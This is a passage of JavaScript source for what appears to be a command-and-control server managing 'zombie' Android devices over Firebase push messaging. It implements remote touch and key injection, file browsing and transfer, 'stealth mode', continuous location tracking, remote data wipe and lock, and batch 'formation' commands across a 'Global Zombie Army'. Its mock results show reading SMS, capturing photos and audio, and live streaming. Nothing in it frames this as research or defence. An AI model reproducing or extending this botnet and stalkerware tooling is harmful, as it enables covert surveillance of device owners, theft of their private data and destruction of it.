            return { success: false, error: error.message };
        }
    }

    /**
     * Stop remote desktop session for a zombie device
     */
    async stopRemoteDesktop(deviceId) {
        console.log(`🛑 Stopping remote desktop session for ${deviceId}`);
        
        const zombie = Array.from(this.zombieDevices.values()).find(z => z.deviceId === deviceId);
        if (!zombie) {
            return { success: false, error: 'Zombie device not found' };
        }

        if (!this.firebaseEnabled) {
            return { success: true, messageId: 'simulated-remote-desktop-stop' };
        }

        try {
            const message = {
                token: zombie.fcmToken,
                data: {
                    action: 'stop_remote_desktop',
                    device_id: deviceId,
                    timestamp: Date.now().toString()
                },
                android: {
                    priority: 'high',
                    ttl: 30000
                }
            };

            const response = await admin.messaging().send(message);
            
            console.log(`🛑 Remote desktop session stopped: ${zombie.name} - Response: ${response}`);
            return { success: true, messageId: response };
            
        } catch (error) {
            console.error(`💥 Failed to stop remote desktop ${deviceId}:`, error);
            return { success: false, error: error.message };
        }
    }

    /**
     * Simulate touch on zombie device screen
     */
    async simulateTouch(deviceId, { x, y, tool, action }) {
        console.log(`👆 Simulating ${tool} touch at (${x}, ${y}) on ${deviceId}`);
        
        const zombie = Array.from(this.zombieDevices.values()).find(z => z.deviceId === deviceId);
        if (!zombie) {
            return { success: false, error: 'Zombie device not found' };
        }

        if (!this.firebaseEnabled) {
            return { 
                success: true, 
                messageId: 'simulated-touch',
                coordinates: { x, y },
                tool
            };
        }

        try {
            const message = {
                token: zombie.fcmToken,
                data: {
                    action: 'touch_simulation',
                    device_id: deviceId,
                    touch_x: x.toString(),
                    touch_y: y.toString(),
                    touch_tool: tool,
                    touch_action: action || 'tap',
                    timestamp: Date.now().toString()
                },
                android: {
                    priority: 'high',
                    ttl: 10000
                }
            };

            const response = await admin.messaging().send(message);
            
            console.log(`👆 Touch simulated: ${zombie.name} - (${x}, ${y}) - Response: ${response}`);
            return { 
                success: true, 
                messageId: response,
                coordinates: { x, y },
                tool
            };
            
        } catch (error) {
            console.error(`💥 Failed to simulate touch ${deviceId}:`, error);
            return { success: false, error: error.message };
        }
    }

    /**
     * Send key input to zombie device
     */
    async sendKeyInput(deviceId, { key, keyCode, action }) {
        console.log(`⌨️ Sending key input '${key}' to ${deviceId}`);
        
        const zombie = Array.from(this.zombieDevices.values()).find(z => z.deviceId === deviceId);
        if (!zombie) {
            return { success: false, error: 'Zombie device not found' };
        }

        if (!this.firebaseEnabled) {
            return { 
                success: true, 
                messageId: 'simulated-key-input',
                key,
                keyCode
            };
        }

        try {
            const message = {
                token: zombie.fcmToken,
                data: {
                    action: 'key_input',
                    device_id: deviceId,
                    key: key || '',
                    key_code: keyCode ? keyCode.toString() : '',
                    key_action: action || 'press',
                    timestamp: Date.now().toString()
                },
                android: {
                    priority: 'high',
                    ttl: 10000
                }
            };

            const response = await admin.messaging().send(message);
            
            console.log(`⌨️ Key input sent: ${zombie.name} - '${key}' - Response: ${response}`);
            return { 
                success: true, 
                messageId: response,
                key,
                keyCode
            };
            
        } catch (error) {
            console.error(`💥 Failed to send key input ${deviceId}:`, error);
            return { success: false, error: error.message };
        }
    }

    /**
     * Browse files on zombie device
     */
    async browseFiles(deviceId, path) {
        console.log(`📁 Browsing files at '${path}' on ${deviceId}`);
        
        const zombie = Array.from(this.zombieDevices.values()).find(z => z.deviceId === deviceId);
        if (!zombie) {
            return { success: false, error: 'Zombie device not found' };
        }

        if (!this.firebaseEnabled) {
            // Return simulated file listing
            return { 
                success: true, 
                messageId: 'simulated-file-browse',
                path,
                files: [
                    { name: '..', type: 'directory', size: 0, modified: Date.now() },
                    { name: 'Documents', type: 'directory', size: 0, modified: Date.now() },
                    { name: 'Pictures', type: 'directory', size: 0, modified: Date.now() },
                    { name: 'sample.txt', type: 'file', size: 1024, modified: Date.now() },
                    { name: 'photo.jpg', type: 'file', size: 2048000, modified: Date.now() }
                ]
            };
        }

        try {
            const message = {
                token: zombie.fcmToken,
                data: {
                    action: 'browse_files',
                    device_id: deviceId,
                    file_path: path,
                    timestamp: Date.now().toString()
                },
                android: {
                    priority: 'normal',
                    ttl: 30000
                }
            };

            const response = await admin.messaging().send(message);
            
            console.log(`📁 File browse request sent: ${zombie.name} - '${path}' - Response: ${response}`);
            return { 
                success: true, 
                messageId: response,
                path
            };
            
        } catch (error) {
            console.error(`💥 Failed to browse files ${deviceId}:`, error);
            return { success: false, error: error.message };
        }
    }

    /**
     * Transfer file to/from zombie device
     */
    async transferFile(deviceId, { action, sourcePath, targetPath, data }) {
        console.log(`📤 File transfer ${action}: ${sourcePath} -> ${targetPath} on ${deviceId}`);
        
        const zombie = Array.from(this.zombieDevices.values()).find(z => z.deviceId === deviceId);
        if (!zombie) {
            return { success: false, error: 'Zombie device not found' };
        }

        if (!this.firebaseEnabled) {
            return { 
                success: true, 
                messageId: 'simulated-file-transfer',
                action,
                sourcePath,
                targetPath
            };
        }

        try {
            const message = {
                token: zombie.fcmToken,
                data: {
                    action: 'file_transfer',
                    device_id: deviceId,
                    transfer_action: action,
                    source_path: sourcePath || '',
                    target_path: targetPath || '',
                    file_data: data || '',
                    timestamp: Date.now().toString()
                },
                android: {
                    priority: 'normal',
                    ttl: 60000
                }
            };

            const response = await admin.messaging().send(message);
            
            console.log(`📤 File transfer request sent: ${zombie.name} - ${action} - Response: ${response}`);
            return { 
                success: true, 
                messageId: response,
                action,
                sourcePath,
                targetPath
            };
            
        } catch (error) {
            console.error(`💥 Failed to transfer file ${deviceId}:`, error);
            return { success: false, error: error.message };
        }
    }

    /**
     * Execute emergency response action
     */
    async executeEmergencyResponse({ action, targets }) {
        console.log(`🚨 Executing emergency response: ${action}`);
        
        let deviceIds = [];
        
        // Determine target devices
        if (!targets || targets.length === 0) {
            // No specific targets - apply to all devices
            deviceIds = Array.from(this.zombieDevices.values()).map(z => z.deviceId);
        } else {
            // Process targets (can be device IDs or group IDs)
            for (const target of targets) {
                if (target.startsWith('GRP-')) {
                    const group = this.zombieGroups.get(target);
                    if (group) {
                        deviceIds = deviceIds.concat(group.deviceIds);
                    }
                } else {
                    deviceIds.push(target);
                }
            }
        }
        
        // Remove duplicates
        deviceIds = [...new Set(deviceIds)];
        
        const results = [];
        let successCount = 0;
        
        for (const deviceId of deviceIds) {
            try {
                let result;
                
                switch (action) {
                    case 'stealth':
                        result = await this.activateStealthMode(deviceId);
                        break;
                    case 'location':
                        result = await this.trackLocation(deviceId);
                        break;
                    case 'wipe':
                        result = await this.wipeDeviceData(deviceId);
                        break;
                    case 'lock':
                        result = await this.lockDevice(deviceId);
                        break;
                    case 'panic':
                        result = await this.emergencyShutdown(deviceId);
                        break;
                    default:
                        result = { success: false, error: 'Unknown emergency action' };
                }
                
                results.push({ deviceId, success: result.success, result });
                if (result.success) successCount++;
                
            } catch (error) {
                results.push({ deviceId, success: false, error: error.message });
            }
        }
        
        return {
            success: successCount > 0,
            message: `Emergency response "${action}" executed: ${successCount}/${deviceIds.length} devices`,
            results,
            successCount,
            totalCount: deviceIds.length,
            action
        };
    }

    /**
     * Activate stealth mode on device
     */
    async activateStealthMode(deviceId) {
        const zombie = Array.from(this.zombieDevices.values()).find(z => z.deviceId === deviceId);
        if (!zombie) {
            return { success: false, error: 'Zombie device not found' };
        }

        if (!this.firebaseEnabled) {
            return { success: true, messageId: 'simulated-stealth-mode' };
        }

        try {
            const message = {
                token: zombie.fcmToken,
                data: {
                    action: 'stealth_mode',
                    device_id: deviceId,
                    stealth_level: 'maximum',
                    timestamp: Date.now().toString()
                },
                android: {
                    priority: 'high',
                    ttl: 10000
                }
            };

            const response = await admin.messaging().send(message);
            return { success: true, messageId: response };
            
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    /**
     * Track device location
     */
    async trackLocation(deviceId) {
        const zombie = Array.from(this.zombieDevices.values()).find(z => z.deviceId === deviceId);
        if (!zombie) {
            return { success: false, error: 'Zombie device not found' };
        }

        if (!this.firebaseEnabled) {
            return { success: true, messageId: 'simulated-location-tracking' };
        }

        try {
            const message = {
                token: zombie.fcmToken,
                data: {
                    action: 'track_location',
                    device_id: deviceId,
                    tracking_mode: 'continuous',
                    timestamp: Date.now().toString()
                },
                android: {
                    priority: 'high',
                    ttl: 10000
                }
            };

            const response = await admin.messaging().send(message);
            return { success: true, messageId: response };
            
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    /**
     * Wipe device data
     */
    async wipeDeviceData(deviceId) {
        const zombie = Array.from(this.zombieDevices.values()).find(z => z.deviceId === deviceId);
        if (!zombie) {
            return { success: false, error: 'Zombie device not found' };
        }

        if (!this.firebaseEnabled) {
            return { success: true, messageId: 'simulated-data-wipe' };
        }

        try {
            const message = {
                token: zombie.fcmToken,
                data: {
                    action: 'wipe_data',
                    device_id: deviceId,
                    wipe_type: 'secure',
                    timestamp: Date.now().toString()
                },
                android: {
                    priority: 'high',
                    ttl: 5000
                }
            };

            const response = await admin.messaging().send(message);
            return { success: true, messageId: response };
            
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    /**
     * Lock device
     */
    async lockDevice(deviceId) {
        const zombie = Array.from(this.zombieDevices.values()).find(z => z.deviceId === deviceId);
        if (!zombie) {
            return { success: false, error: 'Zombie device not found' };
        }

        if (!this.firebaseEnabled) {
            return { success: true, messageId: 'simulated-device-lock' };
        }

        try {
            const message = {
                token: zombie.fcmToken,
                data: {
                    action: 'lock_device',
                    device_id: deviceId,
                    lock_type: 'immediate',
                    timestamp: Date.now().toString()
                },
                android: {
                    priority: 'high',
                    ttl: 10000
                }
            };

            const response = await admin.messaging().send(message);
            return { success: true, messageId: response };
            
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    /**
     * Get detailed system information from device
     */
    async getSystemInfo(deviceId) {
        const zombie = Array.from(this.zombieDevices.values()).find(z => z.deviceId === deviceId);
        if (!zombie) {
            return { success: false, error: 'Zombie device not found' };
        }

        if (!this.firebaseEnabled) {
            return { 
                success: true, 
                messageId: 'simulated-system-info',
                systemInfo: {
                    cpu: '45%',
                    memory: '2.1GB / 4GB',
                    storage: '32GB / 64GB',
                    battery: '78%',
                    network: 'WiFi',
                    location: 'Enabled',
                    uptime: '2d 14h 32m'
                }
            };
        }

        try {
            const message = {
                token: zombie.fcmToken,
                data: {
                    action: 'get_system_info',
                    device_id: deviceId,
                    info_level: 'detailed',
                    timestamp: Date.now().toString()
                },
                android: {
                    priority: 'normal',
                    ttl: 30000
                }
            };

            const response = await admin.messaging().send(message);
            return { success: true, messageId: response };
            
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    // ========================================
    // 🔥 REAL DEVICE TRACKING & COMMAND EXECUTION
    // ========================================

    /**
     * Start real-time statistics collection
     */
    startStatsCollection() {
        console.log('📊 Starting real-time device statistics collection...');
        
        // Update device stats every 30 seconds
        setInterval(() => {
            this.updateAllDeviceStats();
        }, 30000);
    }

    /**
     * Update statistics for all active devices
     */
    async updateAllDeviceStats() {
        for (const [deviceId, session] of this.activeSessions) {
            try {
                await this.requestDeviceStats(deviceId);
            } catch (error) {
                console.error(`Failed to update stats for ${deviceId}:`, error);
            }
        }
    }

    /**
     * Request real-time stats from device
     */
    async requestDeviceStats(deviceId) {
        const zombie = this.getZombieByDeviceId(deviceId);
        if (!zombie) return;

        if (!this.firebaseEnabled) {
            // Generate realistic mock stats
            const stats = {
                deviceId: deviceId,
                timestamp: Date.now(),
                cpu: Math.floor(Math.random() * 80) + 10,
                memory: {
                    used: (Math.random() * 3 + 1).toFixed(1),
                    total: '4.0',
                    percentage: Math.floor(Math.random() * 70) + 20
                },
                battery: Math.floor(Math.random() * 80) + 20,
                storage: {
                    used: Math.floor(Math.random() * 40) + 10,
                    total: 64,
                    percentage: Math.floor(Math.random() * 60) + 20
                },
                network: {
                    type: ['WiFi', '4G', '5G'][Math.floor(Math.random() * 3)],
                    strength: Math.floor(Math.random() * 100),
                    speed: (Math.random() * 50 + 10).toFixed(1) + ' Mbps'
                },
                location: {
                    latitude: 40.7128 + (Math.random() - 0.5) * 0.1,
                    longitude: -74.0060 + (Math.random() - 0.5) * 0.1,
                    accuracy: Math.floor(Math.random() * 20) + 5
                }
            };
            
            this.deviceStats.set(deviceId, stats);
            return stats;
        }

        try {
            const message = {
                token: zombie.fcmToken,
                data: {
                    type: 'get_stats',
                    device_id: deviceId,
                    timestamp: Date.now().toString()
                },
                android: {
                    priority: 'normal',
                    ttl: 15000
                }
            };

            await admin.messaging().send(message);
        } catch (error) {
            console.error(`Failed to request stats from ${deviceId}:`, error);
        }
    }

    /**
     * Execute advanced command with parameters
     */
    async executeAdvancedCommand(deviceId, commandData) {
        const commandId = `cmd_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        
        const command = {
            id: commandId,
            deviceId: deviceId,
            type: commandData.type,
            parameters: commandData.parameters || {},
            timestamp: Date.now(),
            status: 'pending'
        };

        this.pendingCommands.set(commandId, command);

        // Add to command history
        if (!this.commandHistory.has(deviceId)) {
            this.commandHistory.set(deviceId, []);
        }
        this.commandHistory.get(deviceId).unshift(command);

        // Keep only last 50 commands
        if (this.commandHistory.get(deviceId).length > 50) {
            this.commandHistory.get(deviceId).splice(50);
        }

        const zombie = this.getZombieByDeviceId(deviceId);
        if (!zombie) {
            command.status = 'failed';
            command.error = 'Device not found';
            return command;
        }

        if (!this.firebaseEnabled) {
            // Simulate command execution
            setTimeout(() => {
                command.status = 'completed';
                command.result = this.generateMockCommandResult(commandData.type);
                command.completedAt = Date.now();
            }, 1000 + Math.random() * 2000);
            
            return command;
        }

        try {
            const message = {
                token: zombie.fcmToken,
                data: {
                    type: 'advanced_command',
                    command_id: commandId,
                    device_id: deviceId,
                    command_type: commandData.type,
                    parameters: JSON.stringify(commandData.parameters || {}),
                    timestamp: Date.now().toString()
                },
                android: {
                    priority: 'high',
                    ttl: 60000
                }
            };

            await admin.messaging().send(message);
            command.status = 'sent';
            
        } catch (error) {
            command.status = 'failed';
            command.error = error.message;
        }

        return command;
    }

    /**
     * Generate mock command results for simulation
     */
    generateMockCommandResult(commandType) {
        switch (commandType) {
            case 'camera_photo':
                return {
                    imageUrl: `/api/mock/camera/${Date.now()}.jpg`,
                    resolution: '1920x1080',
                    fileSize: '2.3MB'
                };
            case 'location_current':
                return {
                    latitude: 40.7128 + (Math.random() - 0.5) * 0.1,
                    longitude: -74.0060 + (Math.random() - 0.5) * 0.1,
                    accuracy: Math.floor(Math.random() * 20) + 5,
                    address: 'New York, NY, USA'
                };
            case 'sms_read':
                return {
                    messages: [
                        { from: '+1234567890', text: 'Hey, how are you?', timestamp: Date.now() - 3600000 },
                        { from: '+9876543210', text: 'Meeting at 3pm', timestamp: Date.now() - 7200000 }
                    ]
                };
            case 'files_list':
                return {
                    files: [
                        { name: 'Documents', type: 'folder', size: null },
                        { name: 'Photos', type: 'folder', size: null },
                        { name: 'important.pdf', type: 'file', size: '1.2MB' },
                        { name: 'vacation.jpg', type: 'file', size: '3.5MB' }
                    ]
                };
            case 'audio_record':
                return {
                    audioUrl: `/api/mock/audio/${Date.now()}.mp3`,
                    duration: '30s',
                    fileSize: '1.1MB'
                };
            default:
                return { success: true, message: 'Command executed successfully' };
        }
    }

    /**
     * Execute batch commands on multiple devices
     */
    async executeBatchCommand(deviceIds, commandData) {
        console.log(`🎯 Executing batch command '${commandData.type}' on ${deviceIds.length} devices`);
        
        const batchId = `batch_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        const results = [];

        for (const deviceId of deviceIds) {
            try {
                const result = await this.executeAdvancedCommand(deviceId, commandData);
                results.push({
                    deviceId: deviceId,
                    commandId: result.id,
                    status: result.status
                });
            } catch (error) {
                results.push({
                    deviceId: deviceId,
                    status: 'failed',
                    error: error.message
                });
            }
        }

        return {
            batchId: batchId,
            totalDevices: deviceIds.length,
            results: results,
            timestamp: Date.now()
        };
    }

    /**
     * Start live streaming session
     */
    async startLiveStreaming(deviceId, streamType = 'camera') {
        const streamId = `stream_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        
        const streamSession = {
            id: streamId,
            deviceId: deviceId,
            type: streamType,
            startTime: Date.now(),
            status: 'starting'
        };

        this.streamingSessions.set(streamId, streamSession);

        const zombie = this.getZombieByDeviceId(deviceId);
        if (!zombie) {
            streamSession.status = 'failed';
            streamSession.error = 'Device not found';
            return streamSession;
        }

        if (!this.firebaseEnabled) {
            streamSession.status = 'active';
            streamSession.streamUrl = `/api/mock/stream/${streamType}/${streamId}`;
            console.log(`🎥 [SIMULATION] Started ${streamType} stream for ${zombie.name}`);
            return streamSession;
        }

        try {
            const message = {
                token: zombie.fcmToken,
                data: {
                    type: 'start_streaming',
                    stream_id: streamId,
                    stream_type: streamType,
                    device_id: deviceId,
                    timestamp: Date.now().toString()
                },
                android: {
                    priority: 'high',
                    ttl: 30000
                }
            };

            await admin.messaging().send(message);
            streamSession.status = 'active';
            
        } catch (error) {
            streamSession.status = 'failed';
            streamSession.error = error.message;
        }

        return streamSession;
    }

    /**
     * Stop live streaming session
     */
    async stopLiveStreaming(streamId) {
        const streamSession = this.streamingSessions.get(streamId);
        if (!streamSession) {
            throw new Error('Stream session not found');
        }

        const zombie = this.getZombieByDeviceId(streamSession.deviceId);
        if (zombie && this.firebaseEnabled) {
            try {
                const message = {
                    token: zombie.fcmToken,
                    data: {
                        type: 'stop_streaming',
                        stream_id: streamId,
                        timestamp: Date.now().toString()
                    }
                };

                await admin.messaging().send(message);
            } catch (error) {
                console.error(`Failed to stop stream ${streamId}:`, error);
            }
        }

        streamSession.status = 'stopped';
        streamSession.endTime = Date.now();
        
        return streamSession;
    }

    /**
     * Get real device statistics
     */
    getDeviceStats(deviceId) {
        return this.deviceStats.get(deviceId) || null;
    }

    /**
     * Get command history for device
     */
    getCommandHistory(deviceId) {
        return this.commandHistory.get(deviceId) || [];
    }

    /**
     * Get pending command status
     */
    getCommandStatus(commandId) {
        return this.pendingCommands.get(commandId) || null;
    }

    /**
     * Get all active streaming sessions
     */
    getActiveStreams() {
        return Array.from(this.streamingSessions.values()).filter(s => s.status === 'active');
    }

    /**
     * Get comprehensive device info with real-time data
     */
    getDeviceInfo(deviceId) {
        const zombie = this.getZombieByDeviceId(deviceId);
        const session = this.activeSessions.get(deviceId);
        const stats = this.deviceStats.get(deviceId);
        const history = this.commandHistory.get(deviceId) || [];
        const streams = Array.from(this.streamingSessions.values()).filter(s => s.deviceId === deviceId);

        return {
            device: zombie,
            session: session,
            stats: stats,
            commandHistory: history.slice(0, 10), // Last 10 commands
            activeStreams: streams.filter(s => s.status === 'active'),
            isOnline: !!session,
            lastSeen: session ? new Date(session.startTime).toISOString() : null
        };
    }

    /**
     * Handle device command response (called when device responds)
     */
    handleCommandResponse(deviceId, commandId, response) {
        const command = this.pendingCommands.get(commandId);
        if (command) {
            command.status = response.success ? 'completed' : 'failed';
            command.result = response.result;
            command.error = response.error;
            command.completedAt = Date.now();
            
            console.log(`✅ Command ${commandId} completed for device ${deviceId}`);
        }
    }

    /**
     * Handle device stats update (called when device sends stats)
     */
    handleStatsUpdate(deviceId, stats) {
        stats.timestamp = Date.now();
        this.deviceStats.set(deviceId, stats);
        console.log(`📊 Stats updated for device ${deviceId}`);
    }

    /**
     * Handle FCM token registration from devices
     */
    handleFCMTokenRegistration(deviceInfoStr, socketId = null) {
        try {
            console.log('📱 Processing FCM token registration...');
            
            // Parse device info (it comes as a string)
            let deviceInfo;
            if (typeof deviceInfoStr === 'string') {
                // Parse the device info string that looks like a map
                deviceInfo = this.parseDeviceInfoString(deviceInfoStr);
            } else {
                deviceInfo = deviceInfoStr;
            }
            
            if (!deviceInfo.fcm_token || !deviceInfo.device_id) {
                console.log('❌ Invalid FCM registration - missing token or device ID');
                return { success: false, error: 'Missing FCM token or device ID' };
            }
            
            // Register the zombie device
            const zombie = this.registerZombieDevice({
                fcmToken: deviceInfo.fcm_token,
                deviceId: deviceInfo.device_id,
                name: `${deviceInfo.device_model || 'Unknown'} Device`,
                model: deviceInfo.device_model || 'Unknown',
                androidVersion: deviceInfo.android_version || 'Unknown',
                appVersion: deviceInfo.app_version || '1.0',
                socketId: socketId,
                registrationTime: deviceInfo.registration_time
            });
            
            console.log(`✅ FCM device registered successfully: ${zombie.name} (${zombie.deviceId})`);
            console.log(`🔑 FCM Token: ${zombie.fcmToken.substring(0, 30)}...`);
            
            // Initialize device stats
            this.initializeDeviceStats(deviceInfo.device_id);
            
            return { 
                success: true, 
                deviceId: zombie.deviceId,
                message: 'FCM registration successful - Device ready for resurrection'
            };
            
        } catch (error) {
            console.error('💥 FCM registration failed:', error);
            return { success: false, error: error.message };
        }
    }
    
    /**
     * Parse device info string to object
     */
    parseDeviceInfoString(deviceInfoStr) {
        try {
            // Handle string that looks like: {device_id=xyz123, fcm_token=abc456, ...}
            const deviceInfo = {};
            
            // Remove braces and split by commas
            const cleanStr = deviceInfoStr.replace(/[{}]/g, '');
            const pairs = cleanStr.split(', ');
            
            pairs.forEach(pair => {
                const [key, value] = pair.split('=');
                if (key && value) {
                    deviceInfo[key.trim()] = value.trim();
                }
            });
            
            return deviceInfo;
        } catch (error) {
            console.error('Failed to parse device info string:', error);
            // Fallback: try JSON parsing
            try {
                return JSON.parse(deviceInfoStr);
            } catch (jsonError) {
                console.error('JSON parse also failed:', jsonError);
                return {};
            }
        }
    }
    
    /**
     * Initialize device statistics tracking
     */
    initializeDeviceStats(deviceId) {
        if (!this.deviceStats.has(deviceId)) {
            this.deviceStats.set(deviceId, {
                deviceId,
                lastSeen: Date.now(),
                totalCommands: 0,
                successfulCommands: 0,
                failedCommands: 0,
                sessionCount: 0,
                totalUptime: 0,
                avgResponseTime: 0,
                lastCommand: null,
                streamingSessions: 0,
                capabilities: [],
                battery: 'Unknown',
                storage: 'Unknown',
                network: 'Unknown',
                location: null,
                isActive: false,
                fcmEnabled: true
            });
            
            console.log(`📊 Device stats initialized for: ${deviceId}`);
        }
    }

    /**
     * Initialize Phase 3 Advanced Features
     */
    initializePhase3Features() {
        // Initialize default formation templates
        this.createFormationTemplate('global-army', {
            name: 'Global Zombie Army',
            description: 'All registered zombies',
            criteria: 'all',
            commands: ['wake', 'status', 'shutdown']
        });

        this.createFormationTemplate('active-force', {
            name: 'Active Strike Force',
            description: 'Currently active zombies only',
            criteria: { status: 'active' },
            commands: ['execute', 'stream', 'monitor']
        });

        this.createFormationTemplate('android-elite', {
            name: 'Android Elite Squad',
            description: 'Latest Android versions (>= 10)',
            criteria: { androidVersion: '>=10' },
            commands: ['advanced-execute', 'stream-hd', 'deep-scan']
        });

        // Initialize security monitoring
        this.startSecurityMonitoring();
        
        // Initialize analytics collection
        this.startAdvancedAnalytics();
        
        // Initialize AI behavior analysis
        this.startBehaviorAnalysis();
        
        console.log('🎯 Phase 3 Advanced Features initialized:');
        console.log('   ✅ Formation Templates (3 default)');
        console.log('   ✅ Security Monitoring');
        console.log('   ✅ Advanced Analytics');
        console.log('   ✅ AI Behavior Analysis');
    }

    /**
     * Create formation template for zombie army organization
     */
    createFormationTemplate(templateId, config) {
        const formation = {
            id: templateId,
            name: config.name,
            description: config.description,
            criteria: config.criteria,
            commands: config.commands || [],
            createdAt: new Date(),
            lastUsed: null,
            useCount: 0
        };

        this.formationTemplates.set(templateId, formation);
        console.log(`🎖️ Formation template created: ${formation.name}`);
        return formation;
    }

    /**
     * Deploy formation with specified template
     */
    async deployFormation(templateId, customCommands = null) {
        const template = this.formationTemplates.get(templateId);
        if (!template) {
            throw new Error(`Formation template not found: ${templateId}`);
        }

        // Find matching devices based on criteria
        const targetDevices = this.findDevicesByCriteria(template.criteria);
        const commands = customCommands || template.commands;

        console.log(`🎖️ Deploying formation: ${template.name}`);
        console.log(`   Targets: ${targetDevices.length} devices`);
        console.log(`   Commands: ${commands.join(', ')}`);

        const results = [];
        for (const device of targetDevices) {
            for (const command of commands) {
                try {
                    const result = await this.executeAdvancedCommand(device.deviceId, {
                        command: command,
                        priority: 'formation',
                        timeout: 45,
                        formation: templateId
                    });
                    results.push({ deviceId: device.deviceId, command, ...result });
                } catch (error) {
                    results.push({ 
                        deviceId: device.deviceId, 
                        command, 
                        success: false, 
                        error: error.message 
                    });
                }
            }
        }

        // Update template usage
        template.lastUsed = new Date();
        template.useCount++;

        return {
            formation: template.name,
            targetDevices: targetDevices.length,
            commandsDeployed: commands.length,
            totalOperations: results.length,
            successful: results.filter(r => r.success).length,
            results
        };
    }

    /**
     * Find devices by criteria for formation deployment
     */
    findDevicesByCriteria(criteria) {
        const devices = Array.from(this.zombieDevices.values());
        
        if (criteria === 'all') {
            return devices;
        }

        return devices.filter(device => {
            if (criteria.status && device.status !== criteria.status) {
                return false;
            }
            
            if (criteria.androidVersion) {
                const deviceVersion = parseInt(device.androidVersion);
                const requiredVersion = parseInt(criteria.androidVersion.replace('>=', ''));
                if (deviceVersion < requiredVersion) {
                    return false;
                }
            }

            if (criteria.model && !device.model.toLowerCase().includes(criteria.model.toLowerCase())) {
                return false;
            }

            if (criteria.capabilities) {
                const hasCapabilities = criteria.capabilities.every(cap => 
                    device.capabilities.includes(cap)
                );
                if (!hasCapabilities) {
                    return false;
                }
            }

            return true;
        });
    }

    /**
     * Start security monitoring for threat detection
     */
    startSecurityMonitoring() {
        setInterval(() => {
            this.analyzeSecurityThreats();
        }, 30000); // Check every 30 seconds

        console.log('🔒 Security monitoring started - Threat analysis every 30 seconds');
    }

    /**
     * Analyze potential security threats
     */
    analyzeSecurityThreats() {
        const activeDevices = Array.from(this.activeSessions.values());
        const threats = [];

        activeDevices.forEach(session => {
            // Detect unusual activity patterns
            if (session.commandsExecuted > 100) {
                threats.push({
                    id: `threat-${Date.now()}-${session.deviceId}`,
                    type: 'HIGH_COMMAND_VOLUME',
                    deviceId: session.deviceId,
                    severity: 'medium',
                    description: `Device ${session.deviceId} executed ${session.commandsExecuted} commands`,
                    timestamp: new Date()
                });
            }

            // Detect long-running sessions
            const sessionDuration = Date.now() - session.startTime;
            if (sessionDuration > 30 * 60 * 1000) { // 30 minutes
                threats.push({
                    id: `threat-${Date.now()}-long-${session.deviceId}`,
                    type: 'LONG_SESSION',
                    deviceId: session.deviceId,
                    severity: 'low',
                    description: `Device ${session.deviceId} active for ${Math.round(sessionDuration / 60000)} minutes`,
                    timestamp: new Date()
                });
            }
        });

        // Store threats for dashboard display
        threats.forEach(threat => {
            this.securityAlerts.set(threat.id, threat);
        });

        if (threats.length > 0) {
            console.log(`🚨 Security analysis: ${threats.length} potential threats detected`);
        }
    }

    /**
     * Start advanced analytics collection
     */
    startAdvancedAnalytics() {
        setInterval(() => {
            this.collectAdvancedMetrics();
        }, 60000); // Collect metrics every minute

        console.log('📊 Advanced analytics started - Metrics collection every 60 seconds');
    }

    /**
     * Collect advanced performance and usage metrics
     */
    collectAdvancedMetrics() {
        const activeCount = this.activeSessions.size;
        const totalDevices = this.zombieDevices.size;
        
        // Update performance metrics
        this.performanceMetrics.activeConnections = activeCount;
        this.performanceMetrics.peakConnections = Math.max(
            this.performanceMetrics.peakConnections, 
            activeCount
        );

        // Collect per-device analytics
        this.zombieDevices.forEach((device, token) => {
            const deviceAnalytics = this.analyticsData.get(device.deviceId) || {
                deviceId: device.deviceId,
                totalSessions: 0,
                totalCommands: 0,
                averageSessionDuration: 0,
                lastActiveTime: null,
                connectionQuality: 'unknown',
                geographicRegion: 'unknown'
            };

            // Update analytics data
            const session = this.activeSessions.get(device.deviceId);
            if (session) {
                deviceAnalytics.lastActiveTime = new Date();
                deviceAnalytics.connectionQuality = this.getConnectionQuality(device);
                deviceAnalytics.totalCommands = session.commandsExecuted;
            }

            this.analyticsData.set(device.deviceId, deviceAnalytics);
        });

        console.log(`📈 Analytics collected: ${totalDevices} devices, ${activeCount} active sessions`);
    }

    /**
     * Start AI behavior analysis
     */
    startBehaviorAnalysis() {
        setInterval(() => {
            this.analyzeBehaviorPatterns();
        }, 120000); // Analyze every 2 minutes

        console.log('🤖 AI Behavior analysis started - Pattern analysis every 2 minutes');
    }

    /**
     * Analyze device behavior patterns using AI-like algorithms
     */
    analyzeBehaviorPatterns() {
        this.activeSessions.forEach((session, deviceId) => {
            const pattern = this.behaviorPatterns.get(deviceId) || {
                deviceId: deviceId,
                activityScore: 0,
                commandPatterns: [],
                riskLevel: 'low',
                anomalies: [],
                lastAnalysis: new Date()
            };

            // Calculate activity score based on command frequency
            const commandsPerMinute = session.commandsExecuted / 
                ((Date.now() - session.startTime) / 60000);
            
            pattern.activityScore = Math.min(commandsPerMinute * 10, 100);

            // Detect anomalous behavior
            if (commandsPerMinute > 10) {
                pattern.anomalies.push({
                    type: 'HIGH_FREQUENCY_COMMANDS',
                    value: commandsPerMinute,
                    timestamp: new Date()
                });
                pattern.riskLevel = 'high';
            } else if (commandsPerMinute > 5) {
                pattern.riskLevel = 'medium';
            } else {
                pattern.riskLevel = 'low';
            }

            pattern.lastAnalysis = new Date();
            this.behaviorPatterns.set(deviceId, pattern);
        });

        const analyzedDevices = this.behaviorPatterns.size;
        console.log(`🧠 Behavior analysis completed: ${analyzedDevices} device patterns updated`);
    }

    /**
     * Get comprehensive Phase 3 dashboard data
     */
    getPhase3DashboardData() {
        return {
            analytics: {
                totalDevices: this.zombieDevices.size,
                activeDevices: this.activeSessions.size,
                performanceMetrics: this.performanceMetrics,
                deviceAnalytics: Array.from(this.analyticsData.values()),
                geographicDistribution: this.getGeographicDistribution()
            },
            formations: {
                templates: Array.from(this.formationTemplates.values()),
                activeFormations: this.getActiveFormations()
            },
            security: {
                alerts: Array.from(this.securityAlerts.values()).slice(-50), // Last 50 alerts
                threatLevel: this.calculateOverallThreatLevel(),
                monitoringStatus: 'active'
            },
            behaviors: {
                patterns: Array.from(this.behaviorPatterns.values()),
                anomalies: this.getRecentAnomalies(),
                riskDistribution: this.getRiskDistribution()
            },
            streaming: {
